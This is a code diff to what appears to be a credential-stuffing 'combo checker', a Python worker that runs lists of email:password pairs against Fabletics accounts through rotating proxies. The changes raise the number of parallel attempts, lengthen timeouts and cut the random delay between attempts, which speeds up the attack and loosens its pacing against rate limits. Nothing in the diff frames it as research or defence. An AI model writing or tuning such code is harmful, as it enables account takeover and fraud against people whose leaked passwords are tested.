@@ -156,9 +156,11 @@ class CheckerWorker:
     ) -> None:
         try:
             checked_keys = get_checked_keys()
-            parsed_combos: list[tuple[str, str]] = []
+            to_run: list[tuple[str, str]] = []
             seen_keys: set[str] = set()
             raw_count = 0
+            unique_total = 0
+            skipped = 0
 
             for line in self._iter_combo_lines(combo_lines, combo_file):
                 with self._lock:
@@ -178,19 +180,14 @@ class CheckerWorker:
                 if key in seen_keys:
                     continue
                 seen_keys.add(key)
-                parsed_combos.append(parsed)
-
-            to_run: list[tuple[str, str]] = []
-            skipped = 0
-            for email, password in parsed_combos:
-                key = combo_key(email, password)
+                unique_total += 1
                 if key in checked_keys:
                     skipped += 1
                 else:
                     to_run.append((email, password))
 
             with self._lock:
-                self.stats.total = len(parsed_combos)
+                self.stats.total = unique_total
                 self.stats.queued = len(to_run)
                 self.stats.skipped = skipped
                 self.stats.preparing = False
@@ -198,7 +195,7 @@ class CheckerWorker:
             if skipped:
                 self._log(f"Resuming — skipped {skipped:,} already-checked combo(s)")
 
-            if not parsed_combos:
+            if unique_total == 0:
                 with self._lock:
                     self.stats.running = False
                 self._log("No valid combos found")
@@ -301,8 +298,9 @@ class CheckerWorker:
         proxy_cycle = itertools.cycle(proxies) if proxies else None
         combo_iter = iter(enumerate(combos))
         inflight: dict = {}
-        max_inflight = max(threads * 3, 4)
-        task_timeout = int(os.environ.get("FABLETICS_TASK_TIMEOUT", "100"))
+        max_inflight = max(threads * 5, 8)
+        task_timeout = int(os.environ.get("FABLETICS_TASK_TIMEOUT", "120"))
+        pace_max = float(os.environ.get("FABLETICS_WORKER_PACE_MAX", "0.05"))
 
         def task(idx: int, email: str, password: str):
             with self._lock:
@@ -365,8 +363,8 @@ class CheckerWorker:
                     else:
                         if result is not None:
                             self._record_result(email, password, result)
-                        if not stopped:
-                            time.sleep(random.uniform(0.05, 0.15))
+                        if not stopped and pace_max > 0:
+                            time.sleep(random.uniform(0, pace_max))
 
                     if not stopped:
                         submit_next(pool)
